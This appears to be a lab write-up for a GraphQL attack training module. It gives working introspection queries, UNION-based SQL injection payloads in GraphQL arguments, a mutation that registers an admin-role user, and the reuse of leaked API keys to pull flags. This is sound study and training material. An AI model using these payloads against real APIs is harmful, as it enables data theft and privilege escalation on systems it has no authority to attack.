**Attacking GraphQL**

**question:** After executing an introspection query, what is the flag you can exfiltrate?

git clone [https://github.com/dolevf/graphw00f.git](https://github.com/dolevf/graphw00f.git)

cd graphw00f
python3 main.py -d -f -t [http://172.17.0.2](http://172.17.0.2)

[!] Found GraphQL at [http://172.17.0.2/graphql](http://172.17.0.2/graphql)

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

copy the result
visit [https://apis.guru/graphql-voyager/](https://apis.guru/graphql-voyager/)
change schema > introspection > paste introspection query > click display

visit [http://172.17.0.2/graphql](http://172.17.0.2/graphql)

```graphql
query {
  secrets {
    id
    secret
  }
}
```

> flag

---

**question:** After following the steps in the section, what is the flag you can find in the admin’s password?

visit [http://172.17.0.2/graphql](http://172.17.0.2/graphql)

```graphql
{
  user(username: "admin") {
    username
    password
  }
}
```

---

**question:** Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find?

```graphql
query {
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

```graphql
query {
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -") {
    username
  }
}
```

```graphql
query {
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(flag),4,5,6 FROM flag-- -") {
    username
  }
}
```

---

**question:** What is the flag you find in the admin dashboard?

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}
```

```graphql
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

```graphql
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

echo -n 'password' | md5sum

```graphql
mutation {
  registerUser(
    input: {
      username: "dayangAdmin"
      password: "5f4dcc3b5aa765d61d8327deb882cf99"
      role: "admin"
      msg: "Hacked!"
    }
  ) {
    user {
      username
      password
      msg
      role
    }
  }
}
```

visit [http://94.237.120.137:48670](http://94.237.120.137:48670)
login with credentials
visit /admin

> flag

---

**question:** Exploit the vulnerable GraphQL API to obtain the flag.

```graphql
query {
  activeApiKeys {
    id
    role
    key
  }
}
```

```graphql
query {
  allCustomers(apiKey: "0711a879ed751e63330a78a4b195bbad") {
    id
    firstName
    lastName
    address
  }
}
```

```graphql
query {
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad"
    lastName: "Blair' "
  ) {
    id
    firstName
    lastName
    address
  }
}
```

```graphql
query {
  customerByName(
    apiKey: "0711a879ed751e63330a78a4b195bbad"
    lastName: "' UNION SELECT 1, GROUP_CONCAT(flag), 'dummy', 'dummy' FROM flag-- "
  ) {
    id
    firstName
    lastName
    address
  }
}
```
